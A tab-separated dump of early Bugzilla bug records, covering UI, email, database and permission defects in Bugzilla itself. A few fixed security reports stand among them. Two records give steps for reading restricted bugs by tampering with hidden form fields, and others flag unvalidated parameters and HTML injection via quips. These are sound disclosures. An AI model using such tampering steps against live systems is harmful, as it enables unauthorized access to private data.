38870%TAB%957973646%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%sql syntax error when submitting attachment to bug 1111000,Can attach to an invalid bug number%TAB%sql syntax error when submitting attachment to bug 1111000,Can attach to an invalid bug numberi'm submitting this because "you have an error in your sql syntax" sounds like  a bad (potentially security-compromising) bug, not because i expect "eliminate  all sql errors in bugzilla" to happen any time soon.  Attachment to bug 1111000 created Content-type: text/html  Software error: select login_name from profiles where userid = : You have an error in your SQL  syntax near '' at line 1 at globals.pl line 133.  Please send mail to this site's webmaster for help.
38922%TAB%958022057%TAB%15645%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Wanted: Default CC list for each component,[RFE] Wanted: Default CC list for each component,Default CC list for each component,Default (Initial) CC list for each component%TAB%Wanted: Default CC list for each component,[RFE] Wanted: Default CC list for each component,Default CC list for each component,Default (Initial) CC list for each componentIn addition to specifying a default owner for a component, we'd like to be able  to specify a CC list too. Scenarios in which this would be useful include:  - the default owner is not reading their email (on holiday, say), and a new bug  is raised unnoticed.  - the component is a place holder for sub-components which are owned by  different people, but the person raising the bug is unlikely to be able to  determine which sub-component is at fault.  We'd want to put all sub-component  owners on the default CC list. An alternative would be to specify a maining list  as the default owner, but this would remove the element of personal  responsibility.
39044%TAB%958094719%TAB%15150%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%IE4 gives a script warning on query page when not using milestones,Some vers. of some browsers give a script warning on query page when not using milestones%TAB%IE4 gives a script warning on query page when not using milestones,Some vers. of some browsers give a script warning on query page when not using milestoneshis is the bugzilla 2.10 tarball.  (We once had milestones on, to test with for bugzilla 2.8, but we didn't do  anything with them)  We now have milestones turned off. The milestones table has '---' for each product. The products table has '---' as the default milestone. On IE4, windows 95, the query page gives a script error, saying : line 223 char 16 eerror: 'target_milestone.length' is not an object code: 0
39159%TAB%958151416%TAB%9174%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%reports.cgi should not require GD.pm to syntax check%TAB%reports.cgi should not require GD.pm to syntax checkthe change for r1.31 of reports.cgi added an unconditional "use GD".
39524%TAB%958489098%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%process_bug.cgi doesn't check viewing permissions%TAB%process_bug.cgi doesn't check viewing permissionsSteps to reproduce: 1. Find a restricted bug (bug 28698, for example). 2. Save the page you're reading right now (a normal show_bug.cgi page). 3. Change the form action to an absolute URL on the saved page. 4. Modify hidden form elements so they read: <INPUT TYPE=HIDDEN NAME="delta_ts" VALUE="19950000000000"> <INPUT TYPE=HIDDEN NAME="longdesclength" VALUE="0"> <INPUT TYPE=HIDDEN NAME="id" VALUE=28698>     (use bug number from step 1) 5. Load the modified page. 6. Click "commit".  Actual result: All of the comments on bug 28698 are displayed.  Expected result: process_bug.cgi says something to the effect of "You don't have permission to  view this bug, so you're not allowed to change it either."  Notes: No "mid-air collision" items are listed.  This probably has something to do  with the bogus timestamp.
39526%TAB%958489261%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%show_activity.cgi doesn't check viewing permissions%TAB%show_activity.cgi doesn't check viewing permissionsSteps to reproduce: 1. Find a restricted bug (bug 28698, for example). 2. Save the page you're reading right now (a normal show_bug.cgi page). 3. Change the form action to an absolute URL on the saved page. 4. Modify hidden form elements so they read: <INPUT TYPE=HIDDEN NAME="delta_ts" VALUE="19950000000000"> <INPUT TYPE=HIDDEN NAME="longdesclength" VALUE="0"> <INPUT TYPE=HIDDEN NAME="id" VALUE=28698>     (use bug number from step 1) 5. Load the modified page. 6. Click "commit".  Actual result: All of the comments on bug 28698 are displayed.  Expected result: process_bug.cgi says something to the effect of "You don't have permission to  view this bug, so you're not allowed to change it either."  Notes: No "mid-air collision" items are listed.  This probably has something to do  with the bogus timestamp.
39527%TAB%958489602%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%showvotes.cgi doesn't check viewing permissions%TAB%showvotes.cgi doesn't check viewing permissionsI can also vote on the bug, but I assume I still don't get e-mails related to  it.
39531%TAB%958490530%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%showdependencytree.cgi doesn't check viewing permissions%TAB%showdependencytree.cgi doesn't check viewing permissionshttp://bugzilla.mozilla.org/show_bug.cgi?id=28698 says "permission denied"  http://bugzilla.mozilla.org/showdependencytree.cgi?id=28698 doesn't, but  instead tells me which bugs block and are blocked by the restricted bug.
39533%TAB%958491310%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%showdependencygraph.cgi doesn't check viewing permissions%TAB%showdependencygraph.cgi doesn't check viewing permissionshttp://bugzilla.mozilla.org/show_bug.cgi?id=28698 says "permission denied".  http://bugzilla.mozilla.org/showdependencygraph.cgi?id=28698 doesn't.  (supposedly, when showdependencygraph.cgi is working, it lets you see the  summaries of the bugs involved in addition to the bug numbers.)
39536%TAB%958493005%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%showdependencytree.cgi needs to validate "id" param%TAB%showdependencytree.cgi needs to validate "id" paramshowdependencytree.cgi feeds an unchecked "id" parameter to the person viewing  the page and also to the sql server.  Replace: my $id = $::FORM{'id'}; my $linkedid = qq{<a href="show_bug.cgi?id=$id">$id</a>};  With: my $id = $::FORM{'id'}; die "Invalid id: $id" unless $id =~ /^\s*\d+\s*$/; my $linkedid = qq{<a href="show_bug.cgi?id=$id">$id</a>};  (i don't actually know perl.  "die" line copied from showdependencygraph.cgi.)
39557%TAB%958508253%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%doeditvotes.cgi needs to make sure bugs actually exist%TAB%doeditvotes.cgi needs to make sure bugs actually existi managed to vote for a non-existant bug, bug 40000, by editing a  doeditvotes.cgi url.  the sanity check script didn't like that.
39647%TAB%958562241%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Column width adjustment/word wrap needs%TAB%Column width adjustment/word wrap needsTara, when viewing a bug list...  1) have the keyword field entries wrap so they don't go into/over Summary field. 2) widen the component field about 60% so I can see them better.  Some start  with same lettering, yet end differently...can't see them in this current view.   Example: Profile Manager Backend vs. Profile Manager Frontend.. 
39769%TAB%958651542%TAB%15829%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%%commandmenu% in bannerhtml%TAB%%commandmenu% in bannerhtmlI like to put the command menu in bannerhtml. This causes the query page to  throw up an error, because it tries to send document.forms[0] to the  selectProduct() function. But since %commandmenu% includes a form,  document.forms[0] no longer references the correct form. Here is a patch which  references the form by name.  Index: query.cgi =================================================================== RCS file: /cvsroot/mozilla/webtools/bugzilla/query.cgi,v retrieving revision 1.69 diff -r1.69 query.cgi 473c473 <           q{onLoad="selectProduct(document.forms[0]);"}, --- >           q{onLoad="selectProduct(document.buglist_form);"}, 481c481 < <FORM METHOD=GET ACTION="buglist.cgi"> --- > <FORM NAME=buglist_form METHOD=GET ACTION="buglist.cgi">
39816%TAB%958676669%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Anyone in CC/reporter/QA Contact fields should see restricted bugs%TAB%Anyone in CC/reporter/QA Contact fields should see restricted bugsAnyone listed in the CC, reporter, QA Contact, or owner fields on a bug should be  able to see that bug, regardless of the group permissions set on that bug.  If  you really don't want that person to see that bug, you should take their name off  it, also (since they're going to get emails on it anyway).  This would also have the added bonus of being able to set up a group for "private  bugs" that only the reporter, QA, and the owner could see, by making sure no one  was a member of that "private bugs" group.  Main use of this would be for customer support tickets where the customer could  still be able to view their own bug, while keeping the general public out of it,  and not requiring a group to be created for each customer.
39918%TAB%958747181%TAB%15223%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Mozilla/4.7* [en] (Windows NT 5.0; *)%TAB%Mozilla/4.7* [en] (Windows NT 5.0; *)Some fields initialized from your user-agent, Mozilla/4.73 [en] (Windows NT  5.0; U). If you think it got it wrong, please tell dmose@mozilla.org what it  should have been.   The browser correctly identified itself. But bugzilla doesn't realize that  windows nt 5 is windows 2000.  When I visit bugzilla w/ ie5/5.5 I get OS  Windows2000 selected.  In netscape I get Windows NT.
40286%TAB%959067050%TAB%15478%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%strike-throughs impair readability%TAB%strike-throughs impair readabilityWhen looking at my votes in Bugzilla (http://bugzilla.mozilla.org/showvotes.cgi), resolved bugs are striked-trough, which is perfectly okay for me - it is a good indication about the status. Nevertheless, stiking out the whole summary line doesn't really improve its readability. Wouldn't it be enough to just strike out the bug number?
40451%TAB%959160395%TAB%12963%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Online bugzilla displays version 2.9 even though 2.10 is available%TAB%Online bugzilla displays version 2.9 even though 2.10 is availableThe latest numbered version of bugzilla available from http://ftp.mozilla.org/pub/webtools/ is version 2.10 but the online version is displaying 2.9.  Assuming that the online version is more recent, it should display 2.11.
40603%TAB%959255068%TAB%15351%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Accounts%TAB%Assumes user is coming from different page%TAB%Assumes user is coming from different pageGo to main bugzilla screen and select "Open a new Bugzilla account"  This takes you to createaccount.cgi.  Enter an email address and a real name.   Click submit and you get the "Account created" page.  This page states "When  the e-mail arrives, you can click Back and enter your password in the form  there"  But when you click Back you will go back to the Create Account page.  Considering the other text that appears following the "click back" sentence, I  think the "click back" sentence should just be removed.
40987%TAB%959667313%TAB%14925%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Error message when no components are defined for a product.%TAB%Error message when no components are defined for a product.If you create a new product, but do not create any associated components, you  get this error when you attempt to open a new bug for that product:  >Software error: > >Can't use string ("") as an ARRAY ref while "strict refs" in use at >/usr/data1/webapps/apache/htdocs/bugzilla/enter_bug.cgi line >240.  Instead of this, it would be helpful to get a nice page explaining that at  least one component must be associated with a product before a bug can be  opened for that product. This will spare a good deal of confusion for new  Bugzilla administrators and users.  Regards.  Damon Cassell Engage Technologies
41303%TAB%959925873%TAB%15351%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%new email tech doesn't work with emailregexp%TAB%new email tech doesn't work with emailregexpThe new email tech doesn't seem to work with emailregexp.  It just sends the  email to login_name, without adding emailsuffix.  Since bugzilla is running on  a separate machine from our email server, sendmail just reports 'user not  found' or some such.  None of our bugzilla users have accounts on the actual bugzilla machine.  :)  This problem also extended itself to the CC list for the new email tech as well.  I'm attaching a patch that corrects this.  I'm not sure if it is how mozilla  would implement it.  But I like it (and that's why I'm using it!  :)  At the end of NewProcessOneBug, just before NewProcessOnePerson is called, I  check the format of the person's address using a reg expression that I stole  from defparams ("^[^@, ]*@[^@, ]*\.[^@, ]*$"), which basically checks to see if  the address matches x@x.x  If the name does not match that expression, then I append emailsuffix to the  name.  This corrects the above problems *and* allows someone outside of the  emailsuffix to be put in the CC list.
41519%TAB%960139007%TAB%16280%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%bugzilla won't let me vote: "Wrong login.  The login got confused."%TAB%bugzilla won't let me vote: "Wrong login.  The login got confused."I've tried to vote for the first time.  Each time I try to submit a vote, I get  the following page:  "Wrong login.        The login info got confused. If you want to adjust the votes for  dgm@altavista.net, then please click here."  And the provide link obviously doesn't help, as I haven't got any votes to  adjust yet!
41650%TAB%960248640%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Misleading title after stored query forgotten.%TAB%Misleading title after stored query forgotten.When you forget a query (successfully), the page says so, but the title says "Forget what?" implying something went wrong.
41652%TAB%960249832%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Use Javascript where possible in advanced querying.,Advanced Query: Use JavaScript to modify/create boolean charts%TAB%Use Javascript where possible in advanced querying.,Advanced Query: Use JavaScript to modify/create boolean chartsI'm well aware Terry's policy was not to require Javascript for users of Bugzilla - and the advanced querying facility fits in with this.  But it would be nice if Javascript was used to alter the page instead, where available.  This would be much quicker that loading the page again.  Not sure what DOM level this would require (1?), but I'm pretty sure it's possible.  I guess implementation would involve a script that altered the button behaviour where the DOM facilities are present.
41906%TAB%960424857%TAB%22599%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Don't allow HTML in quips%TAB%Don't allow HTML in quipsThe bug list shows you a short text which can be entered at <http: //bugzilla.mozilla.org/newquip.html> by anybody. (Is there any option to turn it off?) It allows HTML, which is sent directly to the bugzilla user.  That's a perfect way to exploit Mozilla security holes.
41913%TAB%960440486%TAB%15351%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%editkeyword.cgi - "Keyword Added" trailer needs Add link%TAB%editkeyword.cgi - "Keyword Added" trailer needs Add linkI find it extremely frustrating to add keywords using the bugzilla interface.   One of the problems is that after a keyword is added, you have to go back to  the edit screen to get to the add link.  So I've modified editkeyword.cgi to display a different trailer for  the "keyword added" page.  This just adds an Add link to the trailer.  This has already been done for editusers.cgi (Bugzilla 2.10) but not for  keywords or components.  :(
41915%TAB%960442161%TAB%15351%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%editcomponents.cgi - "Component Added" trailer needs Add link%TAB%editcomponents.cgi - "Component Added" trailer needs Add linkI find it extremely frustrating to add components using the bugzilla  interface.  One of the problems is that after a component is added, you have to  go back to the edit screen to get to the add link.  So I've modified editcomponents.cgi to display a different trailer for  the "component added" page.  This just adds a link to the trailer.  I'm rechecking $product, similar to the way $localtrailer is initialized.  I  don't know if this is required...  This has already been done for editusers.cgi (Bugzilla 2.10) but not for  keywords or components.  :(  The same problem when adding keywords is addressed in bug #41913
41972%TAB%960475601%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Pref to turn quips off,Per-user pref to turn quips off%TAB%Pref to turn quips off,Per-user pref to turn quips offI see no reason why being able to turn on/off the quips needs to be an individual user preference.  There's a global preference for the site.  I think humoring this enhancement request would be a waste of time.  The quips are just there for fun, and eye candy -- let the site maintainer decide whether they will use them.  Just my 2 cents :)  Matthew, do you expect me to ask the Mozilla.org admin to turn them off for bugzilla.mozilla.org? Maybe I don't consider them eye candy but annoying? Please take a look at the bugzilla.mozilla.org quip file and see how much it is abused.
42037%TAB%960537437%TAB%15351%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Passwords visible on editusers.cgi page%TAB%Passwords visible on editusers.cgi pageWhen editing users via the editusers.cgi page, the user's password is visible.   This causes some concern for our users, since they may want to use one of their  common passwords.  It is trivial to change this field to a password field so the password isn't  visible.  Someone with rights can still change a users password, they just  can't see it on the screen.  I've attached a patch to make this change.  Bugzilla passwords are still stored in the mysql database as plain text.   However, I suspect that very few bugzilla users have direct access to mysql.
42041%TAB%960538734%TAB%14831%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%QA contact field shows summary of bug in columns view%TAB%QA contact field shows summary of bug in columns viewIf you "change columns" after listing bugs (buglist.cgi) and add a "QA Contact" to the listing, if there is no QA contact for a bug, the summary of the bug shows up in the QA contact field.  We probably need to rethink the logic on the multiple bug view screen, or else always ensure every bug has a QA contact.  I just ran into this one on my system, too.  Tracked it down, wound up being an  easy fix.  This was because the query was returning a null value for the QA  Contact if there wasn't one.  The table, instead of generating an empty cell when  it got a null value, just skipped it, so everything to the right of it slid over  one column to the left (didn't matter if it was the summary or what, that just  happened to be coincidence).  I'm attaching a patch to fix this.
42165%TAB%960675474%TAB%12170%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bugzilla's Apache server responded with "URI too long" error%TAB%Bugzilla's Apache server responded with "URI too long" errorOverview Description:  Bugzilla sent a URL of length 10930 bytes to Apache, which caused  Apache to choke.   Steps to Reproduce:  -- Well don't bother reproducing it, but what I did was ...  1) I was changing the Product for a bug while adding comments, etc.,    which then sent me to the page for selecting component/milestone/version.   2) This is done by using GET's to maintain the state across the pages    (i.e., encoding state in the URL).  3) I was also adding a couple of stack traces inline with my other    comments and changes.  Actual Results:   Apache returned an error for 'URI too long' (not an exact quote)  Expected Results:   Successfully complete the update (although I don't really expect   this given the situation)  Reproducibility: well, in this case, always, but it's a special case.  Additional Information:  You can resolve this as wontfix if you like. I realize that avoiding  this limit would mean some significant changes to Bugzilla. If anything, probably better to just detect this situation before it happens, and  give a more graceful message to the end user.    Here's the URL that was generated (I think it will get through here,  since this is a POST). 
42261%TAB%960811515%TAB%16567%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%typo in globals.pl%TAB%typo in globals.pl...should be errstr, not errmsg.  135c135 <       || die "$str: " . $::db->errstr; --- >       || die "$str: " . $::db->errmsg;
42337%TAB%960865406%TAB%6793%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%More visual when encountering in attaching files,More visual when encountering errors in attaching files%TAB%More visual when encountering in attaching files,More visual when encountering errors in attaching filesIf you fx forget to fill out the file type when attaching a file to bugzilla,  bugzilla only shows a small error.  I really like the "normal" big red error message when forgetting to fill out  required fields. Please implement this for the "attach file" dialog too.
42354%TAB%960876092%TAB%15093%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Administration%TAB%Not checking loading of 'localconfig' properly%TAB%Not checking loading of 'localconfig' properlyAfter a while of wondering why my local configuration file 'localconfig' was not being used, I discovered that the file access permissions were not set properly for it. The code ought to be modified so that a warning is generated in the script when a problem in the local config occurs (so that it can be rectified by the maintainer). It also came to my attention (when implementing exception handling on loading the localconfig file) that it is possible for the file to return 0 (if the last array in the code is empty).  So the checkconfig script was changed to fix this problem.  A patch to fix these 'features' will follow. I hope this will be of use and considered for inclusion.
42445%TAB%960917891%TAB%12244%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mozilla Developer,bugzilla.org%TAB%CVS instuctions confusing, error prone%TAB%CVS instuctions confusing, error proneHope I have the wrong product+component here...  View http://www.mozilla.org/bugs/source.html  It refers you to the main CVS instruction page. I, and quite possible many other users interested in the bugzilla source, go there, and follow the intructions there. This ends up getting you only the source for the client, and no webtools.  <shaver> there should be something in there telling you that this is what you           do to get the Mozilla client source <shaver> (I think) <shaver> or maybe bugzilla's page should be more explicit (jmd) yah, maybe just a note on the bugzilla page would be easiest <shaver> file a bug =)        <--------------- (well here it is) (jmd) just a reminder to checkout branch XXXX, using the EXAMPLE on the cvs       instr. page
42609%TAB%961029418%TAB%15928%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Miscellaneous,Bugzilla,Bugzilla-General%TAB%Only allow well formed URLs in URL field of bug report%TAB%Only allow well formed URLs in URL field of bug reportSome people enter an URL in the URL field of a bug report without the "http://" at the beginning; when clicking on such a link, it treats it as relative to http://bugzilla.mozilla.org/.  URLs like that should be rejected.
42809%TAB%961135251%TAB%16754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%bug_email.pl doesn't allow for priority = 0%TAB%bug_email.pl doesn't allow for priority = 0-I have changed my priorities to 0..3 in my bugzilla setup. -bug_email.pl doesn't handle a priority of 0 (will default to default priority) -bug_email.pl is from the mozilla CVS  Problem: in the CheckPriority routine L288 is : <<<<<<<my $prio = ($Control{'priority'} ||= ""); as you can see if our priority that was read in was zero it get's zapped changing L288 to: >>>>>>>my $prio = $Control{'priority'};  will solve this problem along with  <<<<<<<if( (lsearch( \@all_prios, $prio ) == -1) || $prio eq "" ) { changing L291 to: >>>>>>>if( $prio eq "" || (lsearch( \@all_prios, $prio ) == -1)  ) {  to accomplish the same level of safety as before... :) I'll attach my diff.. /Brad   I'll attach my diff.
42810%TAB%961135784%TAB%13734%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%Quotes in product or version field%TAB%Quotes in product or version fieldIf you place a single qoute "'" in one of the fields which is used by the "selectComponent" JavaScript in the query page than the Java Script breaks. Consequence: Quote everything that might break the JavaScript.
42851%TAB%961152767%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Use listbox with input for CC management on bug form,[patch] Use listbox with input for CC management on bug form%TAB%Use listbox with input for CC management on bug form,[patch] Use listbox with input for CC management on bug formWith some bugs now getting long lists of CCs on them, trying to edit the list of  CCs starts to be a chore.  You can accidently remove someone if you remove one  letter from their email address while trying to edit the list.  What I propose is  to place a listbox on the form with the current CC addresses in it.  Under the  listbox would be a checkbox for "remove selected addresses".  If you want to  remove someone, you select their name in the list, and check the remove box.   There would also be a text input under it for "Add CC" to allow you to add one or  more additional addresses.  For related bugs that aren't quite the same, see: - bug 7345 (blind CCs) - bug 28849 (don't allow non-editors to add/remove anyone other than themselves)  - bug 34488 (button to add me to the CC list)  I am attaching two files to this bug.  The first is a diff of bug_form.pl with  the code changes to place this list on the form.  The second is an HTML file with  the output of the above form.  NOTE: DO NOT install this on a production Bugzilla (yet).  Although this  bug_form.pl is fully functional, I have not modified process_bug.cgi to handle  the revised fields yet, and it'll break things without both files being updated.   I'm putting this here now so people can look at it.  Feel free to put it on a  test installation and look at bugs with it, but don't try changing them or you'll  likely delete people off the CC lists. :)  Regarding process_bug.cgi, I would like help updating this to handle the new  fields.  I do not quite understand what it's doing, and don't want to break it.   I could probably figure it out if I stared at it a while, but if whoever wrote  the RelationSet.pm thing would take a look at it, it would probably be much  easier for them.  (copying those two on this bug for that reason)  In the new form, the listbox is named 'cc', the checkbox for remove is named  'removecc', and the text input for adding CCs is named 'newcc'.
42946%TAB%961270114%TAB%10067%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bugs filed at same time causing one to be duplicated.%TAB%Bugs filed at same time causing one to be duplicated.Lately I've noticed a lot of bugs being duplicated. There will be 2 (or more)  bug reports that are exact duplicate execpt for the assigned number. I've looked  at several and noticed that the lowest numbered bug of the pair has the same  filing time as diferent bug filed by another reporter.  Sounds to me like the table was locked while the update action from the first   person was being performed, and the person submitting the second bug got   impatient and hit the refresh button to repost it.  Except that it had already   been posted, it was just waiting for a database lock.  So now it gets posted   twice.
43551%TAB%961687962%TAB%16965%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%bugzilla handles "days since last changed" incorrectly%TAB%bugzilla handles "days since last changed" incorrectlyFrom Bugzilla Helper: User-Agent: Mozilla/4.06 (Macintosh; I; PPC, Nav) BuildID:      If you search for all bugs, with less than X days since last changed, Bugzilla  does not check the year.  Thus, if i search on June 25 for all bugs changed  within the last 5 days, I will get bugs from June 21-25, 1999, 1998, etc. as  well as those from June 21-25, 2000.  Reproducible: Always Steps to Reproduce: 1.Go to the Bugzilla Query Page 2.Search for all bugs with days since bug changed < 5. 3.Look at the results.  There will be some bugs from 1999.  Actual Results:  Some bugs from 1999.  Expected Results:  Only bugs from 2000.  Probably just Bugzilla ignoring the year, though it could POSSIBLY be a Y2K  problem.
43600%TAB%961729484%TAB%15093%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Duplicate field names in bugzilla tables,Duplicate field names in bugzilla tables (component IDs etc.)%TAB%Duplicate field names in bugzilla tables,Duplicate field names in bugzilla tables (component IDs etc.)Throudg using bugzilla, and maintaining our site it has become apparent to me that there is a lot of duplicate data in database that makes it difficult to maintain. For example, the components.value field exists not only in the components table, but also as a reference to the component in the bugs table. It would make sence if all tables that are referenced from other tables should be done so through use of a key. In the example outlined above of the components table being referenced from the bugs table, the components table should be augmented to have a primary key added to it with the bugs table having the component column replaced by a component_id column. This would mean that when the componets.value field was updated for whatever reason, no other field in the database need to change to keep the database current.  I have started implementing these changes, and will submit patches as a followup to this bug report.  I hope that this code will help ease the maintenance of existing databases.  Regared,
43637%TAB%961751787%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%userregexp is not applied when creating a new group%TAB%userregexp is not applied when creating a new groupAs the summary says, the userregexp is not applied when creating a new group.   The user should probably be prompted whether or not they want it applied, and it  might be nice to also offer to show them a list of users that are already in the  system that match it also.
43821%TAB%962005734%TAB%1644%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla generates invalid HTML,Bugzilla generates invalid HTML (should fix for 2.12),bug_form.pl has unbalanced <TABLE> tags,PutHeader has unbalanced <TABLE> tags%TAB%Bugzilla generates invalid HTML,Bugzilla generates invalid HTML (should fix for 2.12),bug_form.pl has unbalanced <TABLE> tags,PutHeader has unbalanced <TABLE> tagsOpen any bug from your browser and look at the source. Line 32 duplicates line 31 like this:  </TD></TR></TABLE> </TD></TR></TABLE>
43900%TAB%962037559%TAB%17119%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Accounts%TAB%cookie-based user authentication fails immediately after password change ,cookie-based user authentication fails immediately after password change%TAB%cookie-based user authentication fails immediately after password change ,cookie-based user authentication fails immediately after password changeThe cryptpassword field in the table logincookies and cryptpassword field in the table profiles go out of sync immediately after a password change.  This causes an authentication failure in the cookie based user authentication, forcing the user to have to log on again (right after they've changed their passwords).    When the user logs on, a new cookie (which reflects the changed password) is set, and the cookie-based authentication mechanism works again.  This is not a serious bug.  It is just a bit annoying for users to have to retype usernames and passwords immediately after they've just typed them in (in the change password process).  Steps to reproduce:  - log in  - go to the edit prefs page (userprefs.cgi)  - on the account settings bank, change your password (fill in old password, new password, re-enter new password and click on submit)  - Bugzilla comes back with a message to the effect that the changes have been saved  - click on any of the links where authentication is required (e.g. enter_bug.cgi, any of the other banks on user preferences - e.g. email settings)  - Bugzilla requests reauthentication of the user   (The SQL statement in the subroutine quietly_check_login in CGI.pl will set $ok to 0 if profiles.cryptpassword != logincookies.cryptpassword)   Suggested fix: Add a few lines to the subroutine SaveAccount to sync the cryptpassword fields in the tables profiles and logincookies when user passwords are changed.
43930%TAB%962085935%TAB%15351%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%query.cgi shutdownhtml PutHeader%TAB%query.cgi shutdownhtml PutHeaderquery.cgi normally creates a form with numerous objects.  A JavaScript function  called selectProduct is called when the page loads (onLoad).  This function  references several of the objects on the form.  However, if shutdownhtml is defined then the form is not created but  selectProduct is still called.  This causes an undefined object error.  There are two solutions that I can think of.  First, if shutdownhtml is  defined, then the onLoad should be omitted from the page.  However, the onLoad  is part of the header constant passed to PutHeader.  PutHeader determines if  shutdownhtml is defined and I'm not sure how the constant could be made  optional or parsed out when shutdownhtml is defined.  I'm not familar enough  with PutHeader to know if this type of option would be valid for everywhere  PutHeader is used.  The second fix (easier but not has optimal) is to modify the selectProduct code  to exit if the form is not defined.  This is what I've done and it works -  albiet a hack.
44040%TAB%962126650%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%sanitycheck.cgi dies if apostrophes in product, component, version, or milestone%TAB%sanitycheck.cgi dies if apostrophes in product, component, version, or milestoneAs the summary says, sanitycheck.cgi dies if there are apostrophes in the  product, component, version, or milestone names.  This is due to a lack of proper  quoting when generating the queries sent to the database.  Attaching a patch to fix this.
44076%TAB%962160784%TAB%17189%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Non empty shutdownhtml with NS on Mac%TAB%Non empty shutdownhtml with NS on MacWhen editing the parameters with NS (4.61) on the mac "/n" character gets  inserted into all the empty textareas, this is not a problem with the the headers  but causes the shutdownhtml parameter to be not empty so the rest of bugzilla  shuts down.   As the charater is only a linefeed no message about the shutdown is displayed  The only way to clear this field on the mac is to use the reset button or MSIE  This occurs in v 2.10 as well as 2.11
44119%TAB%962192846%TAB%1537%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla Helper,Bugzilla-General%TAB%bugzilla helper contains invalied component of "other"%TAB%bugzilla helper contains invalied component of "other"The bugzilla helper contains an invalid "other" component for the Browser product.  If a user selects this, he/she gets a "database corruption" error spit back at him.    The right fix is presumably for the helper to be integrated with Bugzilla and get its component list from the database directly.  But for the moment, at least, just removing the "other" from the helper would be fine.
